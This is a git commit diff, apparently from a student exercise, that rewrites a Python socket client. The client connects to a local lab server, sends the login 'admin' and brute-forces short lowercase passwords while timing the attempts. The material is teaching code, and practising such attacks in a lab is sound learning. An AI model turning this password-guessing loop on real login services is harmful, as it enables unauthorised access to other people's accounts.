a3305b801a9497b59b2b2b490ade5acfb2075748
al3x6 <alexisar2002@gmail.com>
2024-09-16 12:28:55 +0200

    exercice brut force

--- socket_brutForce.py
+++ socket_brutForce.py
@@ -1,72 +1,61 @@
 import socket
 import time
-import string
 
-# Fonction pour générer les mots de passe avec brute force
-def generer_mot_de_passe_brute_force():
-    chars = string.ascii_lowercase  # Utilisation des lettres de a à z
-    mot_de_passe = ['a']  # Démarre avec 'a'
+def generate_words():
+    """
+    Return : liste de mot, str
+    """
+    alphabet = [chr(i) for i in range(ord('a'), ord('z')+1)]
+    words = []
+
+    for word_length in range(1, 5):
+        for letter1 in alphabet:
+            words.append(letter1)
+            for letter2 in alphabet:
+                words.append(letter1 + letter2)
+                for letter3 in alphabet:
+                    words.append(letter1 + letter2 + letter3)
+                    for letter4 in alphabet:
+                        words.append(letter1 + letter2 + letter3 + letter4)
+
+    return words
+
+def client_program():
+    host = socket.gethostname()
+    port = 3837
+
+    client_socket = socket.socket()
+    client_socket.connect((host, port))
     
-    while True:
-        yield ''.join(mot_de_passe)
+    message = client_socket.recv(1024).decode()
+    print(f"Serveur : {message}")
+    
+    client_socket.send("admin".encode())
+    message = client_socket.recv(1024).decode()
+    print(f"Serveur : {message}")
+    
+    start_time = time.time()
+    
+    #liste=[]
+    liste=generate_words()
+    print(liste)
+    
+    input()
+    
+    for password in liste:
+        print("password :",password)
         
-        # On incrémente le mot de passe (ex: a -> b, z -> aa, ab -> ac, etc.)
-        for i in range(len(mot_de_passe) - 1, -1, -1):
-            if mot_de_passe[i] != 'z':
-                mot_de_passe[i] = chr(ord(mot_de_passe[i]) + 1)
-                break
-            else:
-                mot_de_passe[i] = 'a'
-                if i == 0:
-                    mot_de_passe.append('a')
-                continue
-
-# Fonction du client qui tente le brute force
-def brute_force_login():
-    host = 'localhost'  # Adresse du serveur
-    port = 1234
-
-    # Connexion au serveur
-    s = socket.socket()
-    s.connect((host, port))
-
-    # Réception de la bannière
-    print(s.recv(1024).decode())
-
-    # Envoi du login correct
-    login = "admin"
-    s.send(login.encode())
-
-    # Réception de la réponse du serveur concernant le login
-    print(s.recv(1024).decode())
-
-    # Initialisation du brute force
-    generer_mdp = generer_mot_de_passe_brute_force()
-    trouve = False
-    debut = time.time()  # Temps de départ
-
-    # Boucle brute force pour tester chaque mot de passe
-    while not trouve:
-        # Génère un nouveau mot de passe
-        tentative_mdp = next(generer_mdp)
+        client_socket.send(password.encode())
+        message = client_socket.recv(1024).decode()
+        print(f"Serveur : {message}")
         
-        # Envoi de la tentative de mot de passe au serveur
-        s.send(tentative_mdp.encode())
-        
-        # Réception de la réponse du serveur
-        reponse = s.recv(1024).decode()
-        print(f"Test du mot de passe : {tentative_mdp} -> {reponse}")
-        
-        if "Mot de passe correct" in reponse:
-            trouve = True
+        if message == "Connexion réussie !":
+            end_time = time.time()
+            print(f"Mot de passe trouvé : {password}")
+            print(f"Temps écoulé : {end_time - start_time} secondes")
+            return
+    
+    client_socket.close()
 
-    # Calcul du temps écoulé
-    fin = time.time()
-    print(f"Mot de passe trouvé : {tentative_mdp}")
-    print(f"Temps pris : {fin - debut:.2f} secondes")
-
-    # Fermeture de la connexion
-    s.close()
-
-# Exécution du client
-brute_force_login()
+if __name__ == "__main__":
+    client_program()
